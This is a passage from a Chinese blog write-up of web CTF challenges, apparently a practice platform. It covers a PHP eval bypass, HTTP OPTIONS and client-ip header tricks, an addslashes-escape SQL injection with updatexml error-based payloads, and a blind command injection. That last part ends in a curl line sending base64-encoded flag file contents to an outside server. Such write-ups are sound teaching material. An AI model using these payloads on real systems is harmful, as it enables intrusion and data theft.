</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>((</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$f</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>13</span><span class=p>)</span> <span class=o>||</span> <span class=p>(</span><span class=k>false</span> <span class=o>!==</span> <span class=nx>stripos</span><span class=p>(</span><span class=nv>$f</span><span class=p>,</span><span class=s1>&#39;return&#39;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s1>&#39;wowwwwwwwwwwwwwwwwwwwwwwwww&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>try</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>         <span class=k>eval</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\$</span><span class=s2>spaceone = </span><span class=si>$f</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>catch</span> <span class=p>(</span><span class=nx>Exception</span> <span class=nv>$e</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$spaceone</span> <span class=o>===</span><span class=s1>&#39;flag&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;helloctf.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>。。。看似过滤一大堆，实际上直接 POST 提交 <code>flag=flag;</code> 就完了，需要注意的就是最后的分号。</p><h2 id=not-found>Not Found</h2><p>首页直接跳转到不存在的 <code>404.php</code>，在响应头中发现 <code>X-Method: haha</code> 字段。一次尝试 HTTP 方法，当使用 <code>OPTIONS</code> 时，发现响应头中多出了 <code>Location: ?f=1.php</code> 字段。对这个 url 也进行 <code>OPTIONS</code> 请求，得到一段源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    <span class=nv>$msg</span> <span class=o>=</span> <span class=s2>&#34;not here&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$msg</span> <span class=o>.=</span> <span class=nx>PHP_EOL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$msg</span> <span class=o>.=</span><span class=s2>&#34;plz trying&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>echo</span> <span class=nv>$msg</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>直接访问 <code>1.php</code> 发现这就是 <code>1.php</code> 的源码。猜测这个 <code>f</code> 参数的功能就是文件读取，尝试 <code>index.php</code> 发现不允许。最后发现 <code>.htaccess</code> 却可以读：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>RewriteEngine On
</span></span><span class=line><span class=cl>RewriteBase /
</span></span><span class=line><span class=cl>RewriteRule ^8d829d8568e46455104209db5cd9228d.html$ 404.php [L]
</span></span></code></pre></td></tr></table></div></div><p>因此我们访问这个 html 得到提示，修改 XFF 头，但是无效。因此我们换而修改 <code>client-ip</code> 头为 <code>127.0.0.1</code> 得到 flag。</p><h2 id=vld>Vld</h2><p>F12 得到提示 <code>index.php.txt</code>，访问得到了一个看不太懂的文件，似乎是 php 的 opcode。耐心分析还是不难理解的，需要三个 GET 参数 <code>flag1, flag2, flag3</code>，分别等于 <code>fvhjjihfcv, gfuyiyhioyf, yugoiiyhi</code>。访问新 url 可以下载到源码。</p><p>观察源码发现关键的地方在于：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=cm>/* dbmysql.class.php */</span>
</span></span><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>my_md5</span><span class=p>(</span><span class=nv>$string</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>md5</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$string</span><span class=p>),</span><span class=mi>5</span><span class=p>,</span><span class=mi>24</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>safe_data</span><span class=p>(</span><span class=nv>$value</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>MAGIC_QUOTES_GPC</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nx>stripcslashes</span><span class=p>(</span><span class=nv>$value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nv>$value</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* login.php */</span>
</span></span><span class=line><span class=cl><span class=nv>$username</span> <span class=o>=</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>safe_data</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nv>$password</span> <span class=o>=</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>my_md5</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nv>$number</span> <span class=o>=</span> <span class=nx>is_numeric</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;number&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;number&#39;</span><span class=p>]</span> <span class=o>:</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$username</span> <span class=o>=</span> <span class=nx>trim</span><span class=p>(</span><span class=nx>str_replace</span><span class=p>(</span><span class=nv>$number</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$username</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nv>$sql</span> <span class=o>=</span> <span class=s2>&#34;select * from&#34;</span><span class=o>.</span><span class=s2>&#34;`&#34;</span><span class=o>.</span><span class=nx>table_name</span><span class=o>.</span><span class=s2>&#34;`&#34;</span><span class=o>.</span><span class=s2>&#34;where username=&#34;</span><span class=o>.</span><span class=s2>&#34;&#39;&#34;</span><span class=o>.</span><span class=s2>&#34;</span><span class=si>$username</span><span class=s2>&#34;</span><span class=o>.</span><span class=s2>&#34;&#39;&#34;</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>这里可以看到 <code>username</code> 会先被 <code>addslashes</code>，然后其中和 <code>number</code> 相同的部分会被去掉。这样我们就能让 <code>'</code> 逃过转义，当我们提交 <code>username=%00'</code> 时，会被 <code>addslashes</code> 转义为 <code>\0\'</code>，如果 <code>number=0</code>，则其中的 0 会被替换掉变成 <code>\\'</code>，此时第二个 <code>\</code> 被转义，原 SQL 语句变为 <code>where username='\\'</code>，成功闭合。</p><p>然后就是报错注入，注意语句中不能再出现 <code>0</code> 了：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>number=0&amp;username=%00&#39;or updatexml(1,concat(hex(126),(select group_concat(table_name) from information_schema.tables where table_schema=database()),hex(126)),1)#&amp;password=ccc&amp;submit=
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>number=0&amp;username=%00&#39;or updatexml(1,concat(hex(126),(select flag from flag),hex(126)),1)#&amp;password=ccc&amp;submit=
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>number=0&amp;username=%00&#39;or updatexml(1,concat(hex(126),substr((select flag from flag),21,99),hex(126)),1)#&amp;password=ccc&amp;submit=
</span></span></code></pre></td></tr></table></div></div><h2 id=exec>EXEC</h2><p>F12 在 html 的 head 标签中发现 <code>editor="vim"</code>，显然能下载 <code>.index.php.swp</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>flag in flag233.php
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl> <span class=k>function</span> <span class=nf>check</span><span class=p>(</span><span class=nv>$number</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$one</span> <span class=o>=</span> <span class=nx>ord</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$nine</span> <span class=o>=</span> <span class=nx>ord</span><span class=p>(</span><span class=s1>&#39;9&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$number</span><span class=p>);</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>$digit</span> <span class=o>=</span> <span class=nx>ord</span><span class=p>(</span><span class=nv>$number</span><span class=p>{</span><span class=nv>$i</span><span class=p>});</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>((</span><span class=nv>$digit</span><span class=o>&gt;=</span> <span class=nv>$one</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nv>$digit</span> <span class=o>&lt;=</span> <span class=nv>$nine</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>           <span class=k>return</span> <span class=nv>$number</span> <span class=o>==</span> <span class=s1>&#39;11259375&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=nx>sign</span><span class=p>])</span><span class=o>&amp;&amp;</span> <span class=nx>check</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=nx>sign</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>        <span class=nx>setcookie</span><span class=p>(</span><span class=s1>&#39;auth&#39;</span><span class=p>,</span><span class=s1>&#39;tcp tunnel is forbidden!&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>                <span class=nv>$command</span><span class=o>=</span><span class=nv>$_POST</span><span class=p>[</span><span class=nx>cmd</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=nv>$result</span><span class=o>=</span><span class=nx>exec</span><span class=p>(</span><span class=nv>$command</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=c1>//echo $result;
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s1>&#39;no sign&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>首先需要一个 GET 参数，其值为 <code>11259375</code> 但不能包含 <code>1-9</code> 中的数字。注意到这里的弱比较，可以将该数字转为十六进制，恰好为 <code>0xabcdef</code>，不包含 <code>1-9</code>，因此提交 <code>?sign=0xabcdef</code> 可以发现 <code>no sign</code> 的提示没有了。</p><p>接下来在保留刚才的参数的同时 POST 命令就可以执行了，但是没有回显，猜想是通过 <code>nc</code> 把 <code>flag233.php</code> 反弹到自己的服务器上，并且需要走 UDP，但是最终没有成功。最终采用了 curl 的方法，把文件内容 base64 编码后放在 url 里向服务器发送请求，并在日志中查看 flag。payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cmd=data=$(cat flag233.php | base64);curl http://xx.xx.xx.xx?data=$data;
</span></span></code></pre></td></tr></table></div></div><p>在 <code>access.log</code> 中即可得到编码后的 <code>flag233.php</code>。</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2019-08-24</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/php/>PHP</a>,&nbsp;<a href=/tags/hash/>Hash</a>,&nbsp;<a href=/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%B8%8E%E7%BC%96%E7%A0%81/>古典密码与编码</a>,&nbsp;<a href=/tags/sqli/>SQLi</a>,&nbsp;<a href=/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/>文件上传</a>,&nbsp;<a href=/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>反序列化</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/shiyanba-web/ class=prev rel=prev title="实验吧 Web 练习记录"><i class="fas fa-angle-left fa-fw"></i>实验吧 Web 练习记录</a>
<a href=/isg2019/ class=next rel=next title="ISG2019 线上赛比赛记录">ISG2019 线上赛比赛记录<i class="fas fa-angle-right fa-fw"></i></a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.99.0">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2017 - 2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>Mercury</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=/lib/lightgallery/lightgallery.min.css><link rel=stylesheet href=/lib/katex/katex.min.css><script type=text/javascript src=/lib/valine/Valine.min.js></script><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/algoliasearch/algoliasearch-lite.umd.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-thumbnail.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-zoom.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js></script><script type=text/javascript src=/lib/katex/auto-render.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:30},comment:{valine:{appId:"RkxCznUcvfzFBgfMiMr0BAfd-gzGzoHsz",appKey:"sw2sEPOl4haCAXKUFYiBFMrR",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"zh-cn",pageSize:10,placeholder:"你的评论 ...",recordIP:!1,visitor:!0}},lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{algoliaAppID:"P149SBLX5U",algoliaIndex:"blog",algoliaSearchKey:"cbd5db1f3910ee11bc18688f21b64bd4",highlightTag:"em",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:50,type:"algolia"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>